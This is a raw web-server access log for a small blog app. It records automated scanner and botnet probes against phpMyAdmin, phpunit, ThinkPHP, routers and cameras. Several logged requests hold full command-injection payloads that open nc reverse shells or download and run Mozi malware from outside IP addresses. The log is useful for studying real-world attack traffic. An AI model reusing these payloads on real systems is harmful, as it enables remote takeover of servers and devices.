[0mGET //nosuichfile.php [33m404 [0m0.934 ms - 913[0m
[0mGET //php-my-admin/scripts/setup.php [33m404 [0m1.840 ms - 913[0m
[0mGET //phpMyAdmi/scripts/setup.php [33m404 [0m1.089 ms - 913[0m
[0mGET //phpMyAdmin-2/scripts/setup.php [33m404 [0m0.978 ms - 913[0m
[0mGET //phpMyAdmin-3/scripts/setup.php [33m404 [0m1.033 ms - 913[0m
[0mGET //phpMyAdmin-4/scripts/setup.php [33m404 [0m0.944 ms - 913[0m
[0mGET //phpMyAdmin/scripts/setup.php [33m404 [0m1.008 ms - 913[0m
[0mGET //phpMyAdmin1/scripts/setup.php [33m404 [0m0.945 ms - 913[0m
[0mGET //phpMyAdmin2/scripts/setup.php [33m404 [0m0.988 ms - 913[0m
[0mGET //phpmy-admin/scripts/setup.php [33m404 [0m0.983 ms - 913[0m
[0mGET //phpmy/scripts/setup.php [33m404 [0m0.959 ms - 913[0m
[0mGET //phpmyad/scripts/setup.php [33m404 [0m1.041 ms - 913[0m
[0mGET //phpmyadmin/scripts/setup.php [33m404 [0m1.011 ms - 913[0m
[0mGET //phpmyadmin2/scripts/setup.php [33m404 [0m0.990 ms - 913[0m
[0mGET //pma2005/scripts/setup.php [33m404 [0m3.682 ms - 913[0m
[0mGET //sqlmanager/scripts/setup.php [33m404 [0m0.958 ms - 913[0m
[0mGET //vhcs2/tools/pma/scripts/setup.php [33m404 [0m0.999 ms - 913[0m
[0mGET //web/phpMyAdmin/scripts/setup.php [33m404 [0m1.014 ms - 913[0m
[0mGET //webadmin/scripts/setup.php [33m404 [0m0.997 ms - 913[0m
[0mGET //webdb/scripts/setup.php [33m404 [0m0.877 ms - 913[0m
[0mGET //websql/scripts/setup.php [33m404 [0m1.740 ms - 913[0m
[0mPOST /boaform/admin/formLogin [33m404 [0m0.995 ms - 913[0m
[0mGET /.env [33m404 [0m0.844 ms - 913[0m
[0mPOST / [33m404 [0m1.059 ms - 913[0m
[0mGET / [32m200 [0m0.896 ms - 809[0m
[0mPOST /boaform/admin/formLogin [33m404 [0m0.968 ms - 913[0m
[0mGET /solr/admin/info/system?wt=json [33m404 [0m0.958 ms - 913[0m
[0mGET /?XDEBUG_SESSION_START=phpstorm [32m200 [0m0.903 ms - 809[0m
[0mGET / [32m200 [0m0.958 ms - 809[0m
[0mGET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> [32m200 [0m0.902 ms - 809[0m
[0mGET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP [33m404 [0m0.974 ms - 913[0m
[0mGET / [32m200 [0m0.857 ms - 809[0m
[0mGET / [32m200 [0m0.876 ms - 809[0m
[0mGET /config/getuser?index=0 [33m404 [0m1.019 ms - 913[0m
[0mGET / [32m200 [0m0.855 ms - 809[0m
[0mGET /set_ftp.cgi?loginuse=&loginpas=&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28nc+89.248.166.183+1245+-e+%2Fbin%2Fsh%29 [0m- [0m- ms - -[0m
[0mGET /ftptest.cgi?loginuse=&loginpas= [33m404 [0m0.963 ms - 913[0m
[0mPOST /api/jsonws/invoke [33m404 [0m0.922 ms - 913[0m
[0mGET / [32m200 [0m0.981 ms - 809[0m
[0mGET / [32m200 [0m0.840 ms - 809[0m
[0mGET / [32m200 [0m0.901 ms - 809[0m
[0mGET / [32m200 [0m0.894 ms - 809[0m
[0mGET / [32m200 [0m0.868 ms - 809[0m
[0mGET /incl/image_test.shtml?camnbr=%3c%21--%23exec%20cmd=%22mkfifo%20/tmp/s;nc%20-w%205%2083.97.20.130%2029312%200%3C/tmp/s|/bin/sh%3E/tmp/s%202%3E/tmp/s;rm%20/tmp/s%22%20--%3e [33m404 [0m0.977 ms - 913[0m
[0mGET /.env [33m404 [0m0.884 ms - 913[0m
[0mPOST / [33m404 [0m0.845 ms - 913[0m
[0mGET /shell?cd+/tmp;rm+-rf+*;wget+http://116.74.21.27:56074/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws [33m404 [0m1.014 ms - 913[0m
[0mGET / [32m200 [0m0.845 ms - 809[0m
[0mGET /manager/text/list [33m404 [0m1.025 ms - 913[0m
[0mGET / [32m200 [0m0.901 ms - 809[0m
[0mGET / [32m200 [0m0.851 ms - 809[0m
[0mGET /.env [33m404 [0m0.918 ms - 913[0m
[0mPOST / [33m404 [0m1.053 ms - 913[0m
[0mGET /manager/html [33m404 [0m0.997 ms - 913[0m
[0mGET http://example.com/ [32m200 [0m0.904 ms - 809[0m
[0mGET /config/getuser?index=0 [33m404 [0m0.995 ms - 913[0m
[0mGET / [32m200 [0m0.858 ms - 809[0m
[0mGET / [32m200 [0m0.903 ms - 809[0m
[0mGET / [32m200 [0m0.810 ms - 809[0m
[0mGET /cgi-bin/kerbynet?Section=NoAuthREQ&Action=x509List&type=*%22;cd%20%2Ftmp;curl%20-O%20http%3A%2F%2F5.206.227.228%2Fzero;sh%20zero;%22 [33m404 [0m1.908 ms - 913[0m
[0mGET / [32m200 [0m0.930 ms - 809[0m
[0mGET /portal/redlion [33m404 [0m0.993 ms - 913[0m
[0mHEAD /robots.txt [33m404 [0m1.035 ms - 913[0m
[0mGET /shell?cd+/tmp;rm+-rf+*;wget+http://59.177.39.224:39300/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws [33m404 [0m0.993 ms - 913[0m
[0mPOST /HNAP1/ [33m404 [0m0.823 ms - 913[0m
[0mGET /config/getuser?index=0 [33m404 [0m1.000 ms - 913[0m
[0mPOST /HNAP1/ [33m404 [0m0.835 ms - 913[0m
[0mGET / [32m200 [0m0.960 ms - 809[0m
[0mGET /setup.cgi [33m404 [0m1.091 ms - 913[0m
[0mGET / [32m200 [0m0.710 ms - 809[0m
[0mGET / [32m200 [0m1.023 ms - 809[0m
[0mGET /robots.txt [33m404 [0m4.898 ms - 913[0m
[0mGET /sitemap.xml [33m404 [0m1.050 ms - 913[0m
[0mGET /.well-known/security.txt [33m404 [0m0.929 ms - 913[0m
[0mGET /favicon.ico [33m404 [0m0.881 ms - 913[0m
[0mPOST /GponForm/diag_Form?images/ [33m404 [0m0.746 ms - 913[0m
[0mGET http://169.254.169.254/latest/meta-data/ [33m404 [0m1.131 ms - 913[0m
[0mPOST /GponForm/diag_Form?images/ [33m404 [0m0.740 ms - 913[0m
[0mPOST /GponForm/diag_Form?images/ [33m404 [0m0.736 ms - 913[0m
[0mGET / [32m200 [0m0.920 ms - 809[0m
[0mGET / [32m200 [0m0.739 ms - 809[0m
[0mGET / [32m200 [0m5.333 ms - 809[0m
[0mGET / [32m200 [0m0.711 ms - 809[0m
[0mGET / [32m200 [0m0.858 ms - 809[0m
[0mGET / [32m200 [0m0.868 ms - 809[0m
[0mGET /solr/admin/info/system?wt=json [33m404 [0m1.098 ms - 913[0m
[0mGET /?XDEBUG_SESSION_START=phpstorm [32m200 [0m0.940 ms - 809[0m
[0mGET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> [32m200 [0m0.947 ms - 809[0m
[0mGET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP [33m404 [0m1.858 ms - 913[0m
[0mGET / [32m200 [0m0.904 ms - 809[0m
[0mPOST /api/jsonws/invoke [33m404 [0m0.882 ms - 913[0m
[0mGET / [32m200 [0m0.961 ms - 809[0m
[0mGET /config/getuser?index=0 [33m404 [0m1.010 ms - 913[0m
[0mGET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m1.112 ms - 913[0m
[0mGET /TP/public/index.php [33m404 [0m2.805 ms - 913[0m
[0mGET /TP/index.php [33m404 [0m0.967 ms - 913[0m
[0mGET /thinkphp/html/public/index.php [33m404 [0m1.034 ms - 913[0m
[0mGET /html/public/index.php [33m404 [0m1.058 ms - 913[0m
[0mGET /public/index.php [33m404 [0m1.091 ms - 913[0m
[0mGET /TP/html/public/index.php [33m404 [0m1.056 ms - 913[0m
[0mGET /elrekt.php [33m404 [0m1.127 ms - 913[0m
[0mGET /index.php [33m404 [0m0.976 ms - 913[0m
[0mGET / [32m200 [0m0.814 ms - 809[0m
[0mPOST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m0.979 ms - 913[0m
[0mGET /portal/redlion [33m404 [0m0.954 ms - 913[0m
[0mGET /boaform/admin/formLogin?username=ec8&psd=ec8 [33m404 [0m1.025 ms - 913[0m
[0mGET / [32m200 [0m0.928 ms - 809[0m
[0mGET / [32m200 [0m1.663 ms - 809[0m
[0mGET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://112.30.1.168:43261/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 [33m404 [0m1.005 ms - 913[0m
[0mPOST /HNAP1/ [33m404 [0m0.845 ms - 913[0m
[0mPOST /HNAP1/ [33m404 [0m0.796 ms - 913[0m
[0mGET / [32m200 [0m0.935 ms - 809[0m
[0mGET / [32m200 [0m0.774 ms - 809[0m
[0mPOST /HNAP1/ [33m404 [0m0.840 ms - 913[0m
[0mGET /.env [33m404 [0m0.881 ms - 913[0m
[0mPOST / [33m404 [0m0.801 ms - 913[0m
[0mGET /manager/html [33m404 [0m1.042 ms - 913[0m
[0mGET / [32m200 [0m1.895 ms - 809[0m
[0mGET /config/getuser?index=0 [33m404 [0m1.101 ms - 913[0m
[0mGET / [32m200 [0m0.935 ms - 809[0m
[0mGET /.env [33m404 [0m0.900 ms - 913[0m
[0mPOST / [33m404 [0m0.989 ms - 913[0m
[0mGET / [32m200 [0m0.842 ms - 809[0m
[0mGET /robots.txt [33m404 [0m1.019 ms - 913[0m
[0mGET /sitemap.xml [33m404 [0m1.003 ms - 913[0m
[0mGET /.well-known/security.txt [33m404 [0m1.089 ms - 913[0m
[0mGET /favicon.ico [33m404 [0m1.891 ms - 913[0m
[0mGET /manager/html [33m404 [0m1.106 ms - 913[0m
[0mGET / [32m200 [0m0.890 ms - 809[0m
[0mGET / [32m200 [0m1.039 ms - 809[0m
[0mGET / [32m200 [0m0.680 ms - 809[0m
[0mGET / [32m200 [0m0.900 ms - 809[0m
[0mGET / [32m200 [0m0.867 ms - 809[0m
[0mGET / [32m200 [0m0.739 ms - 809[0m
[0mGET /boaform/admin/formLogin?username=ec8&psd=ec8 [33m404 [0m0.967 ms - 913[0m
[0mGET / [32m200 [0m0.906 ms - 809[0m
[0mGET /solr/admin/info/system?wt=json [33m404 [0m1.024 ms - 913[0m
[0mPOST /GponForm/diag_Form?images/ [33m404 [0m0.751 ms - 913[0m
[0mGET /?XDEBUG_SESSION_START=phpstorm [32m200 [0m0.864 ms - 809[0m
[0mPOST /GponForm/diag_Form?images/ [33m404 [0m0.732 ms - 913[0m
[0mGET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> [32m200 [0m0.917 ms - 809[0m
[0mGET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP [33m404 [0m0.962 ms - 913[0m
[0mGET /config/getuser?index=0 [33m404 [0m0.992 ms - 913[0m
[0mGET /.env [33m404 [0m0.889 ms - 913[0m
[0mPOST / [33m404 [0m0.954 ms - 913[0m
[0mGET /.env [33m404 [0m0.879 ms - 913[0m
[0mPOST / [33m404 [0m0.837 ms - 913[0m
[0mGET //myadmin/scripts/setup.php [33m404 [0m0.995 ms - 913[0m
[0mGET http://5.188.210.227/echo.php [33m404 [0m3.218 ms - 913[0m
[0mGET /shell?cd+/tmp;rm+-rf+*;wget+http://125.46.163.13:45216/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws [33m404 [0m1.025 ms - 913[0m
[0mGET /w00tw00t.at.blackhats.romanian.anti-sec:) [33m404 [0m1.000 ms - 913[0m
[0mGET /phpMyAdmin/scripts/setup.php [33m404 [0m0.944 ms - 913[0m
[0mGET /phpmyadmin/scripts/setup.php [33m404 [0m0.999 ms - 913[0m
[0mGET /pma/scripts/setup.php [33m404 [0m0.968 ms - 913[0m
[0mGET /myadmin/scripts/setup.php [33m404 [0m0.978 ms - 913[0m
[0mGET /MyAdmin/scripts/setup.php [33m404 [0m1.948 ms - 913[0m
[0mGET / [32m200 [0m0.901 ms - 809[0m
[0mGET / [32m200 [0m0.869 ms - 809[0m
[0mGET /.env [33m404 [0m0.810 ms - 913[0m
[0mGET /.remote [33m404 [0m0.745 ms - 913[0m
[0mGET /.local [33m404 [0m0.878 ms - 913[0m
[0mGET /.production [33m404 [0m0.804 ms - 913[0m
[0mPOST //admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m0.719 ms - 913[0m
[0mPOST //api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m0.756 ms - 913[0m
[0mPOST //backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m0.750 ms - 913[0m
[0mPOST //blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m1.701 ms - 913[0m
[0mPOST //cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m0.745 ms - 913[0m
[0mPOST //crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m0.738 ms - 913[0m
[0mPOST //demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m0.746 ms - 913[0m
[0mPOST //dev/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m0.720 ms - 913[0m
[0mPOST //laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m0.724 ms - 913[0m
[0mPOST //lib/phpunit/Util/PHP/eval-stdin.php [33m404 [0m0.762 ms - 913[0m
[0mPOST //lib/phpunit/phpunit/Util/PHP/eval-stdin.php [33m404 [0m0.726 ms - 913[0m
[0mPOST //lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m0.777 ms - 913[0m
[0mPOST //lib/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m0.740 ms - 913[0m
[0mPOST //new/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m0.768 ms - 913[0m
[0mPOST //old/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m0.767 ms - 913[0m
[0mPOST //panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m1.595 ms - 913[0m
[0mPOST //phpunit/Util/PHP/eval-stdin.php [33m404 [0m0.717 ms - 913[0m
[0mPOST //phpunit/phpunit/Util/PHP/eval-stdin.php [33m404 [0m0.765 ms - 913[0m
[0mPOST //phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m0.713 ms - 913[0m
[0mPOST //phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m0.770 ms - 913[0m
[0mPOST //protected/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m0.744 ms - 913[0m
[0mPOST //sites/all/libraries/mailchimp/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m0.609 ms - 913[0m
[0mPOST //vendor/phpunit/Util/PHP/eval-stdin.php [33m404 [0m0.788 ms - 913[0m
[0mPOST //vendor/phpunit/phpunit/Util/PHP/eval-stdin.php [33m404 [0m0.755 ms - 913[0m
[0mPOST //vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m0.635 ms - 913[0m
[0mPOST //vendor/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m0.646 ms - 913[0m
[0mPOST //wp-content/plugins/cloudflare/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m0.751 ms - 913[0m
[0mPOST //wp-content/plugins/dzs-videogallery/class_parts/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m0.688 ms - 913[0m
[0mPOST //wp-content/plugins/jekyll-exporter/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m0.732 ms - 913[0m
[0mPOST //wp-content/plugins/mm-plugin/inc/vendors/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m0.759 ms - 913[0m
[0mPOST //www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m0.708 ms - 913[0m
[0mGET / [32m200 [0m0.993 ms - 809[0m
[0mGET / [32m200 [0m0.694 ms - 809[0m
[0mPOST /api/jsonws/invoke [33m404 [0m0.936 ms - 913[0m
[0mGET / [32m200 [0m0.883 ms - 809[0m
[0mPOST /boaform/admin/formLogin [33m404 [0m0.965 ms - 913[0m
[0mGET /solr/admin/info/system?wt=json [33m404 [0m0.957 ms - 913[0m
[0mGET /?XDEBUG_SESSION_START=phpstorm [32m200 [0m1.794 ms - 809[0m
[0mGET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> [32m200 [0m0.866 ms - 809[0m
[0mGET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP [33m404 [0m0.988 ms - 913[0m
[0mGET /config/getuser?index=0 [33m404 [0m1.039 ms - 913[0m
[0mGET / [32m200 [0m0.914 ms - 809[0m
[0mPOST /HNAP1/ [33m404 [0m0.825 ms - 913[0m
[0mGET / [32m200 [0m0.853 ms - 809[0m
[0mGET /stylesheets/style.css [32m200 [0m4.096 ms - 111[0m
[0mGET /js/bootstrap.min.js [32m200 [0m1.549 ms - 60044[0m
[0mGET /css/bootstrap.min.css [32m200 [0m5.051 ms - 160302[0m
[0mGET /js/jquery.min.js [32m200 [0m4.114 ms - 89476[0m
[0mGET /favicon.ico [33m404 [0m1.030 ms - 913[0m
[0mGET / [36m304 [0m0.884 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.416 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.516 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m0.611 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m0.483 ms - -[0m
[0mGET /blogList [32m200 [0m1.721 ms - 782[0m
[0mGET /stylesheets/style.css [36m304 [0m0.389 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.498 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m0.693 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m0.495 ms - -[0m
[0mGET /blogAdd [32m200 [0m2.472 ms - 780[0m
[0mGET /stylesheets/style.css [36m304 [0m0.434 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m2.693 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m0.790 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m0.488 ms - -[0m
[0mGET / [36m304 [0m1.165 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.409 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m1.042 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m1.127 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m0.476 ms - -[0m
[0mGET /blogList [36m304 [0m0.917 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.328 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.878 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m0.919 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m0.473 ms - -[0m
[0mGET /blogAdd [36m304 [0m0.926 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.356 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.486 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m0.560 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m1.292 ms - -[0m
[0mGET / [36m304 [0m0.907 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.325 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.689 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m1.387 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m0.480 ms - -[0m
[0mGET / [32m200 [0m0.939 ms - 809[0m
[0mPOST /api/jsonws/invoke [33m404 [0m1.006 ms - 913[0m
